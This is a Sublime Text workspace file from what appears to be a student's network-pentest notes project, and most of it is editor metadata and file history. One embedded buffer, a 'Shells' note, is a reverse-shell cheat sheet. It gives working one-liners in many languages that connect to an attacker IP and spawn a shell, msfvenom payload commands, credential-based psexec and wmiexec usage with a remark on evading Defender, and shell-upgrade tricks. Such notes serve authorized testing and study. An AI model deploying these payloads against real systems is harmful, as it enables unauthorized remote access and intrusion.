{
	"auto_complete":
	{
		"selected_items":
		[
			[
				"active",
				"activecountermeasures"
			]
		]
	},
	"buffers":
	[
		{
			"file": "3. Gaining Access/RDP",
			"settings":
			{
				"buffer_size": 388,
				"encoding": "UTF-8",
				"line_ending": "Unix"
			}
		},
		{
			"file": "/Users/Drew/Active/Mohawk/Term 6/10030 - MS Security/Project/VulnServer Notes",
			"settings":
			{
				"buffer_size": 5517,
				"encoding": "UTF-8",
				"line_ending": "Unix",
				"name": "VulnServer Notes"
			}
		},
		{
			"file": "3. Gaining Access/Buffer Overflow",
			"settings":
			{
				"buffer_size": 9637,
				"encoding": "UTF-8",
				"line_ending": "Unix"
			}
		},
		{
			"file": "4. Post-Compromise/Interesting Files",
			"settings":
			{
				"buffer_size": 9550,
				"encoding": "UTF-8",
				"line_ending": "Unix"
			}
		},
		{
			"file": "4. Post-Compromise/Active Directory",
			"settings":
			{
				"buffer_size": 4395,
				"encoding": "UTF-8",
				"line_ending": "Unix"
			}
		},
		{
			"contents": "Metasploit\n\tif shell fails to connect\n\t\t- check targets\n\t\t- check payloads\n\t\t\trun options again for payload info\n\t\t- change from staged to non-staged payload\n\t\t\te.g. from windows/meterpreter/reverse_tcp\n\t\t\t\tto windows/meterpreter_reverse_tcp\n\nReverse Shells\n\n\tusing captured credentials\n\t\tquieter but only semi-interactive shells\n\t\t\tsmbexec.py <domain>/<username>:<password>@<victim IP>\n\t\t\twmiexec.py <domain>/<username>:<password>@<victim IP>\n\t\tnoisy but not detected by Window Defender\n\t\t\tpsexec.py <domain>/<username>:<password>@<victim IP>\n\t\tmay not work through Metasploit psexec exploit\n\n\n\t**replace /bin/sh with cmd.exe for Windows\n\t**listener: nc -nvlp <listen_port>\n\n\tBASH\n\t\tTCP\n\t\t\tbash -i >& /dev/tcp/<attacker_IP>/<listen_port> 0>&1\n\t\tUDP\n\t\t\tsh -i >& /dev/udp/<attacker IP>/<listen port> 0>&1\n\n\tPERL\n\t\tLinux\n\t\t\tperl -e 'use Socket;$i=\"<attacker_IP>\";$p=<listen_port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n\t\tWindows\n\t\t\tperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"<attacker IP>:<listen port>\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n\n\n\tPython\n\t\texport RHOST=\"<attacker IP>\";export RPORT=<listen port>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'\n\n\n\t\tpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<attacker_IP>\",<listen_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n\tPowershell\n\n\t\tBind\n\t\t\tstart-bind -port <listener_port>\n\t\tListener\n\t\t\tstart-listener -port <remote_port>\n\n\t\tShell\n\t\t\tinvoke-reversepowershell -reverse -ipaddress <attacker_IP> -port <listener_port>\n\n\t\t\tinvoke-reversepowershell -bind -ipaddress <attacker_IP> -port <listener_port>\n\n\n\t\tpowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"<attacker IP>\",<listen port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n\n\t\tpowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<attacker ip>',<listen port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n\n\tPHP\n\t\tphp -r '$sock=fsockopen(\"<attacker_IP>\",<listen_port>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\t\t\tIf it doesn’t work, try file descriptor 4, 5, 6… instead of 3\n\n\t\tphp -r '$sock=fsockopen(\"<attacker_IP>\",<listen_port>);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\n\n\tRuby\n\t\truby -rsocket -e'f=TCPSocket.open(\"<attacker_IP>\",<listen_port>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n\n\tGo\n\t\techo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"<attacker IP>:<listen port>\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n\n\tNetcat\n\t\tnc <attacker_IP> <listen_port> -e /bin/sh \n\n\t\trm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc <attacker IP> <listen_port> >/tmp/f\n\n\t\trm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <listen_port> 0/tmp/p\n\n\tSocat\n\t\tsocat tcp-connect:<attacker IP>:<listen port> exec:\"bash -li\",pty,stderr,setsid,sigint,sane\n\n\tAWK\n\t\tawk 'BEGIN {s = \"/inet/tcp/0/<attacker IP>/<listen port>\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null\n\n\tNodeJS\n\t\trequire('child_process').exec('nc -e /bin/sh <attacker IP> <listen port>')\n\n\tJava\n\t\tr = Runtime.getRuntime()\n\t\tp = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/<attacker IP>/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\n\t\tp.waitFor()\n\n\txterm\n\t\tRun this on the server. It will try to connect back to <attacker_IP> on TCP  6001:\n\t\t\n\t\txterm -display 10.0.0.1:1\n\n\t\tTo catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):\n\n\t\tXnest :1\n\t\t\n\t\tYou’ll need to authorise the target to connect to you (command also run on your host):\n\t\t\n\t\txhost +targetip\n\t\t\n\tTelnet\n\t\ttelnet <attacker IP> 80 | /bin/bash | telnet <attacker IP> <listen port>\n\n\t\trm -f /tmp/p; mknod /tmp/p p && telnet <attacker IP> <listen port> 0/tmp/p\n\n\tWindows using Python 2.7\n\t\tC:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('<attacker IP>', <listen port>)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"\n\n\tWindows using Ruby\n\t\truby -rsocket -e 'c=TCPSocket.new(\"<attacker IP\",\"<listen port>\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n\n\tC\n\t\t#include <stdio.h>\n\t\t#include <sys/socket.h>\n\t\t#include <netinet/ip.h>\n\t\t#include <arpa/inet.h>\n\t\t#include <unistd.h>\n\n\t\tint main ()\n\n\t\t{\n\t\tconst char* ip = \"<attacker IP>\";\n\t\tstruct sockaddr_in addr;\n\t\taddr.sin_family = AF_INET;\n\t\taddr.sin_port = htons(<listen port>);\n\t\tinet_aton(ip, &addr.sin_addr);\n\t\tint sockfd = socket(AF_INET, SOCK_STREAM, 0);\n\t\tconnect(sockfd, (struct sockaddr *)&addr, sizeof(addr));\n\t\tfor (int i = 0; i < 3; i++)\n\t\t{\n\t\tdup2(sockfd, i);\n\t\t}\n\t\texecve(\"/bin/sh\", NULL, NULL);\n\t\treturn 0;\n\t\t}\n\n\tMeterpreter\n\t\tLinux Non-Staged\n\t\t\tmsfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker IP> LPORT=<listen port> -f elf >reversetcp.elf\n\t\tLinux Staged\n\t\t\tmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<listen port> -f elf >reversetcp.elf\n\t\tWindows Non-Staged\n\t\t\tmsfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<listen port> -f exe > reversetcp.exe\n\t\tWindows Staged\n\t\t\tmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<listen port> -f exe > reversetcp.exe\n\n\n\nBind Shells\n\n\tattacker: nc <victim IP> <listen_port>\n\n\tNetcat\n\t\tnc -nvlp <listen_port> -e /bin/sh \n\n\nUpgrading to TTY Shell\n\n\tpython -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n\tpython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\t\n\t\tstty raw -echo\n\n\techo os.system('/bin/bash')\n\t\n\t/bin/sh -i\n\t\n\tperl —e 'exec \"/bin/sh\";'\n\t\n\tperl: exec \"/bin/sh\";\n\t\n\truby: exec \"/bin/sh\"\n\t\n\tlua: os.execute('/bin/sh')\n\t\n\t(From within IRB)\n\t\texec \"/bin/sh\"\n\t\n\t(From within vi)\n\t\t:!bash\n\t\n\t(From within vi)\n\t\t:set shell=/bin/bash:shell\n\n\t(From within nmap)\n\t\t!sh\n\n",
			"file": "3. Gaining Access/Shells",
			"file_size": 9027,
			"file_write_time": 132488110511368626,
			"settings":
			{
				"buffer_size": 9067,
				"encoding": "UTF-8",
				"line_ending": "Unix"
			}
		}
	],
	"build_system": "",
	"build_system_choices":
	[
	],
	"build_varint": "",
	"command_palette":
	{
		"height": 0.0,
		"last_filter": "",
		"selected_items":
		[
		],
		"width": 0.0
	},
	"console":
	{
		"height": 0.0,
		"history":
		[
		]
	},
	"distraction_free":
	{
		"menu_visible": true,
		"show_minimap": false,
		"show_open_files": false,
		"show_tabs": false,
		"side_bar_visible": false,
		"status_bar_visible": false
	},
	"expanded_folders":
	[
		"/Users/Drew/Documents/GitHub/NPT",
		"/Users/Drew/Documents/GitHub/NPT/1. Passive Recon",
		"/Users/Drew/Documents/GitHub/NPT/2. Active Scanning",
		"/Users/Drew/Documents/GitHub/NPT/3. Gaining Access",
		"/Users/Drew/Documents/GitHub/NPT/4. Post-Compromise",
		"/Users/Drew/Documents/GitHub/NPT/5. Clean Up",
		"/Users/Drew/Documents/GitHub/NPT/6. Reporting"
	],
	"file_history":
	[
		"/Users/Drew/Work/Workflows/Network Pentest/4. Post-Compromise/Interesting Files",
		"/Users/Drew/Work/Workflows/Network Pentest/4. Post-Compromise/Active Directory",
		"/Users/Drew/Work/Workflows/Network Pentest/3. Gaining Access/Shells",
		"/Users/Drew/Work/Workflows/Network Pentest/4. Post-Compromise/File Transfers",
		"/Users/Drew/Work/Workflows/Network Pentest/6. Reporting/Mitigations",
		"/Users/Drew/Work/Workflows/Network Pentest/4. Post-Compromise/Credential Harvesting",
		"/Users/Drew/Work/Workflows/Network Pentest/4. Post-Compromise/Enumeration",
		"/Users/Drew/Work/Workflows/Network Pentest/4. Post-Compromise/Persistence",
		"/Users/Drew/Work/Workflows/Network Pentest/3. Gaining Access/FTP",
		"/Users/Drew/Work/Workflows/Network Pentest/3. Gaining Access/RDP",
		"/Users/Drew/Work/Workflows/Network Pentest/4. Post-Compromise/Pivoting",
		"/Users/Drew/Work/Workflows/Network Pentest/3. Gaining Access/Social Engineering",
		"/Users/Drew/Work/Workflows/Network Pentest/3. Gaining Access/Active Directory",
		"/Users/Drew/Work/Workflows/Network Pentest/3. Gaining Access/SMB",
		"/Users/Drew/Work/Workflows/Network Pentest/2. Active Scanning/ii. Fingerprinting",
		"/Users/Drew/Work/Workflows/Network Pentest/2. Active Scanning/i. Enumeration",
		"/Users/Drew/Work/Workflows/Network Pentest/4. Post-Compromise/Privilege Escalation",
		"/Users/Drew/Work/Workflows/Network Pentest/5. Clean Up/Clean Up",
		"/Users/Drew/Work/Workflows/Network Pentest/1. Passive Recon/ii. Credentials",
		"/Users/Drew/Work/Workflows/Network Pentest/1. Passive Recon/iii. OSINT",
		"/Users/Drew/Work/Workflows/Network Pentest/4. Post-Compromise/Firewall Bypass",
		"/Users/Drew/Work/Workflows/Network Pentest/6. Reporting/Reporting",
		"/Users/Drew/Work/Workflows/Network Pentest/6. Reporting/ii. Mitigations",
		"/Users/Drew/Work/Workflows/Network Pentest/5. Clean Up/i. Clean Up",
		"/Users/Drew/Work/Workflows/Network Pentest/3. Gaining Access/File Uploads",
		"/Users/Drew/Work/Workflows/Network Pentest/4. Post-Compromise/iv. Pivoting",
		"/Users/Drew/Work/Workflows/Network Pentest/4. Post-Compromise/v. Privilege Escalation",
		"/Users/Drew/Work/Workflows/Network Pentest/4. Post-Compromise/i. enumeration",
		"/Users/Drew/Work/Workflows/Network Pentest/3. Gaining Access/IPv6",
		"/Users/Drew/Work/Workflows/Network Pentest/4. Post-Compromise/i. File Transfers",
		"/Users/Drew/Work/Workflows/Network Pentest/4. Maintaining Access/iii. Pivoting",
		"/Users/Drew/Work/Workflows/Network Pentest/3. Gaining Access/Buffer Overflow",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/1. Passive Recon/i. Target Validation",
		"/Users/Drew/Desktop/Sekhmet",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/3. Gaining Access/Buffer Overflow",
		"/Users/Drew/Work/CTFs/Need WriteUp/IOT Village IoTCTF",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/3. Gaining Access/Shells",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/4. Maintaining Access/iv. Privilege Escalation",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/3. Gaining Access/Default Credentials",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/4. Maintaining Access/i. File Transfers",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/3. Gaining Access/File Uploads",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/3. Gaining Access/FTP",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/3. Gaining Access/SMB",
		"/Users/Drew/Work/InfoSec/Blue Team/Threat Hunting/Adversary Emulation",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/3. Gaining Access/SSH",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/2. Active Scanning/iii. Vulnerabilities",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/6. Reporting/i. Reporting",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/4. Maintaining Access/ii. Persistence",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/2. Active Scanning/i. Enumeration",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/2. Active Scanning/ii. Fingerprinting",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/1. Passive Recon/ii. Fingerprinting",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/1. Passive Recon/iii. Credentials",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/3. Gaining Access/Simple Buffer Overflow",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/1. Passive Recon/iv. OSINT",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/2. Active Scanning/i. Scanning",
		"/Users/Drew/Work/CTFs/TryHackMe/Basic Pentesting",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/2. Active Scanning/Web Socket Syntax",
		"/Users/Drew/Work/InfoSec/Workflows/Network Pentest/2. Active Scanning/ii. Enumeration",
		"/Users/Drew/Documents/GitHub/drewadwade.github.io/training/training.html",
		"/Users/Drew/Desktop/Job Hunting",
		"/Users/Drew/Work/InfoSec/Red Team/PenTest/Network/Empire Powershell",
		"/Users/Drew/Library/Application Support/Sublime Text 3/Packages/Projects/PenTest Template/2. Scanning:Enum/ii. Enumeration",
		"/Users/Drew/Library/Application Support/Sublime Text 3/Packages/Projects/PenTest Template/2. Scanning:Enum/i. Scanning",
		"/Users/Drew/Library/Application Support/Sublime Text 3/Packages/User/Preferences.sublime-settings",
		"/Users/Drew/Library/Application Support/Sublime Text 3/Packages/Default/Preferences.sublime-settings",
		"/Users/Drew/Desktop/upcoming training.html",
		"/Users/Drew/Desktop/Azure Fundamentals",
		"/Users/Drew/Projects/InfoSec/Security+/Security+ Notes",
		"/Users/Drew/Work/CTFs/TryHackMe/metasploit",
		"/Users/Drew/Desktop/TCM WAPT",
		"/Users/Drew/Documents/GitHub/drewadwade.github.io/ctfs/ctfs.html",
		"/Users/Drew/Documents/GitHub/drewadwade.github.io/ctfs/2020/Sharky.html",
		"/Users/Drew/Work/CTFs/Need WriteUp/sharkyCTF",
		"/Users/Drew/Downloads/DEFCON28 Quals",
		"/Users/Drew/Downloads/welcome.txt",
		"/Users/Drew/Desktop/miniNetWars3",
		"/Users/Drew/Desktop/PNG.png",
		"/Users/Drew/Desktop/test.pcap",
		"/Users/Drew/Desktop/secret",
		"/Users/Drew/Desktop/RESTful API Hacking",
		"/Users/Drew/Desktop/Courses/WebPenetrationTestingwithKaliLinuxThirdEdition/README.txt",
		"/Users/Drew/Work/CTFs/HackTheBox/Starting Point Labs/Shield/Shield",
		"/Users/Drew/Desktop/Tamvoes/API Endpoints",
		"/Users/Drew/Desktop/BlueTeam/Hardening/Hardening Azure AD",
		"/Users/Drew/Desktop/BlueTeam/Hardening/Securing Active Directory",
		"/Users/Drew/Desktop/DFIR/Linux Forensics",
		"/Users/Drew/Desktop/Threat Intelligence/MITRE ATT&CK/MITRE ATT&CK for CTI",
		"/Users/Drew/Desktop/MITRE ATT&CK for CTI",
		"/Users/Drew/Desktop/PenTest/Network/Priv Esc/Kerberos Attacks",
		"/Users/Drew/Desktop/PenTest/Network/Empire Powershell",
		"/Users/Drew/Desktop/PenTest/Network/Priv Esc/Windows Priv Esc",
		"/Users/Drew/Desktop/PenTest/Network/Metasploit",
		"/Users/Drew/Documents/GitHub/drewadwade.github.io/ctfs/2020/IsolationCon.html",
		"/Users/Drew/Documents/GitHub/drewadwade.github.io/ctfs/2020/Covid19.html",
		"/Users/Drew/Desktop/IoT Hacking",
		"/Users/Drew/Work/CTFs/In Progress/Juice Shop/OWASP Juice Shop",
		"/Users/Drew/ubuntu@ec2-34-219-146-41.us-west-2.compute.amazonaws.com",
		"/Users/Drew/Documents/FS-UAE/Cache/Logs/fs-uae-arcade.log.txt",
		"/Users/Drew/Work/CTFs/Need WriteUp/IsolationCon",
		"/Users/Drew/Desktop/Threat Hunting/Kibana",
		"/Users/Drew/Projects/InfoSec/Network+/Network+ Notes",
		"/Users/Drew/Desktop/PenTest/Network/Priv Esc/Kerberos & Kerberoasting",
		"/Users/Drew/Desktop/DFIR/Autopsy",
		"/Users/Drew/Downloads/untitled.sh",
		"/Users/Drew/Desktop/Pentesting Notes",
		"/Users/Drew/Desktop/JavaScript",
		"/Users/Drew/Work/CTFs/HackTheBox/Starting Point Labs/Vaccine/Vaccine",
		"/Users/Drew/VirtualBox VMs/Off Sec/Kali-2020/Kali_Share/Clipboard",
		"/Users/Drew/Desktop/PenTest/Cloud/Breahing the Cloud Perimeter Workshop",
		"/Users/Drew/Documents/GitHub/CTFs/Natas/Blind_SQLi.py",
		"/Users/Drew/Documents/GitHub/CTFs/Natas/Blind_BASHi.py",
		"/Users/Drew/Work/CTFs/Completed/Shadowbank/ShadowBank - Notes",
		"/Users/Drew/Work/CTFs/In Progress/Natas",
		"/Users/Drew/Desktop/Developer Tools & Javascript for WAPT",
		"/Users/Drew/Downloads/ANT 1AB3 Identity Reflection - Kalaisan Kalaichelvan (001315061).pdf",
		"/Users/Drew/Work/CTFs/HackTheBox/Starting Point Labs/Oopsie/Oopsie",
		"/Volumes/Drew Wade/Term 5/COMP-10111 Powershell/Wk10/random.ps1",
		"/Volumes/Drew Wade/Term 5/COMP-10111 Powershell/Wk10/outvoice.ps1",
		"/Volumes/Drew Wade/Term 5/COMP-10111 Powershell/Wk10/locationerror.ps1",
		"/Volumes/Drew Wade/Term 5/COMP-10111 Powershell/Wk10/destinationcheck.ps1",
		"/Volumes/Drew Wade/Term 5/COMP-10111 Powershell/Wk10/DateCheck.ps1",
		"/Volumes/Drew Wade/Term 5/COMP-10111 Powershell/Wk10/Challenge18.ps1",
		"/Users/Drew/Documents/GitHub/drewadwade.github.io/ctfs/2020/ShadowBank.html",
		"/Users/Drew/Documents/GitHub/drewadwade.github.io/ctfs/2019/MohawkCTF.html",
		"/Users/Drew/Desktop/MohawkCTF.html",
		"/Users/Drew/Documents/GitHub/drewadwade.github.io/ctfs/2020/MohawkCTF.html",
		"/Users/Drew/Work/CTFs/HackTheBox/Starting Point Labs/Archetype/Archetype",
		"/Users/Drew/Mohawk/Term 5/Applied Research 1/Builds & Resources/Banner Rules.txt"
	],
	"find":
	{
		"height": 39.0
	},
	"find_in_files":
	{
		"height": 101.0,
		"where_history":
		[
			""
		]
	},
	"find_state":
	{
		"case_sensitive": true,
		"find_history":
		[
			"9523",
			"10.20.14.203",
			"Nmap scan report for ",
			"4444",
			"\t\n"
		],
		"highlight": true,
		"in_selection": false,
		"preserve_case": false,
		"regex": true,
		"replace_history":
		[
			"<listen_port>",
			"<attacker_IP>",
			"",
			"9523"
		],
		"reverse": false,
		"show_context": true,
		"use_buffer2": true,
		"whole_word": false,
		"wrap": true
	},
	"groups":
	[
		{
			"selected": 5,
			"sheets":
			[
				{
					"buffer": 0,
					"file": "3. Gaining Access/RDP",
					"semi_transient": false,
					"settings":
					{
						"buffer_size": 388,
						"regions":
						{
						},
						"selection":
						[
							[
								388,
								388
							]
						],
						"settings":
						{
							"syntax": "Packages/Text/Plain text.tmLanguage"
						},
						"translation.x": 0.0,
						"translation.y": 0.0,
						"zoom_level": 1.0
					},
					"stack_index": 1,
					"type": "text"
				},
				{
					"buffer": 1,
					"file": "/Users/Drew/Active/Mohawk/Term 6/10030 - MS Security/Project/VulnServer Notes",
					"semi_transient": false,
					"settings":
					{
						"buffer_size": 5517,
						"regions":
						{
						},
						"selection":
						[
							[
								0,
								0
							]
						],
						"settings":
						{
							"auto_name": "VulnServer Notes",
							"syntax": "Packages/Text/Plain text.tmLanguage",
							"translate_tabs_to_spaces": false
						},
						"translation.x": 0.0,
						"translation.y": 0.0,
						"zoom_level": 1.0
					},
					"stack_index": 5,
					"type": "text"
				},
				{
					"buffer": 2,
					"file": "3. Gaining Access/Buffer Overflow",
					"semi_transient": false,
					"settings":
					{
						"buffer_size": 9637,
						"regions":
						{
						},
						"selection":
						[
							[
								6777,
								6923
							]
						],
						"settings":
						{
							"syntax": "Packages/Text/Plain text.tmLanguage",
							"translate_tabs_to_spaces": false
						},
						"translation.x": 0.0,
						"translation.y": 0.0,
						"zoom_level": 1.0
					},
					"stack_index": 4,
					"type": "text"
				},
				{
					"buffer": 3,
					"file": "4. Post-Compromise/Interesting Files",
					"semi_transient": false,
					"settings":
					{
						"buffer_size": 9550,
						"regions":
						{
						},
						"selection":
						[
							[
								1326,
								1326
							]
						],
						"settings":
						{
							"syntax": "Packages/Text/Plain text.tmLanguage",
							"translate_tabs_to_spaces": false
						},
						"translation.x": 0.0,
						"translation.y": 0.0,
						"zoom_level": 1.0
					},
					"stack_index": 3,
					"type": "text"
				},
				{
					"buffer": 4,
					"file": "4. Post-Compromise/Active Directory",
					"semi_transient": false,
					"settings":
					{
						"buffer_size": 4395,
						"regions":
						{
						},
						"selection":
						[
							[
								869,
								869
							]
						],
						"settings":
						{
							"syntax": "Packages/Text/Plain text.tmLanguage",
							"translate_tabs_to_spaces": false
						},
						"translation.x": 0.0,
						"translation.y": 816.0,
						"zoom_level": 1.0
					},
					"stack_index": 2,
					"type": "text"
				},
				{
					"buffer": 5,
					"file": "3. Gaining Access/Shells",
					"semi_transient": false,
					"settings":
					{
						"buffer_size": 9067,
						"regions":
						{
						},
						"selection":
						[
							[
								3745,
								3956
							]
						],
						"settings":
						{
							"syntax": "Packages/Text/Plain text.tmLanguage",
							"translate_tabs_to_spaces": false
						},
						"translation.x": 0.0,
						"translation.y": 3318.0,
						"zoom_level": 1.0
					},
					"stack_index": 0,
					"type": "text"
				}
			]
		}
	],
	"incremental_find":
	{
		"height": 30.0
	},
	"input":
	{
		"height": 38.0
	},
	"layout":
	{
		"cells":
		[
			[
				0,
				0,
				1,
				1
			]
		],
		"cols":
		[
			0.0,
			1.0
		],
		"rows":
		[
			0.0,
			1.0
		]
	},
	"menu_visible": true,
	"output.find_results":
	{
		"height": 0.0
	},
	"pinned_build_system": "",
	"project": "Network Pentest.sublime-project",
	"replace":
	{
		"height": 70.0
	},
	"save_all_on_build": true,
	"select_file":
	{
		"height": 0.0,
		"last_filter": "",
		"selected_items":
		[
		],
		"width": 0.0
	},
	"select_project":
	{
		"height": 0.0,
		"last_filter": "",
		"selected_items":
		[
		],
		"width": 0.0
	},
	"select_symbol":
	{
		"height": 0.0,
		"last_filter": "",
		"selected_items":
		[
		],
		"width": 0.0
	},
	"selected_group": 0,
	"settings":
	{
	},
	"show_minimap": true,
	"show_open_files": false,
	"show_tabs": true,
	"side_bar_visible": true,
	"side_bar_width": 193.0,
	"status_bar_visible": true,
	"template_settings":
	{
	}
}
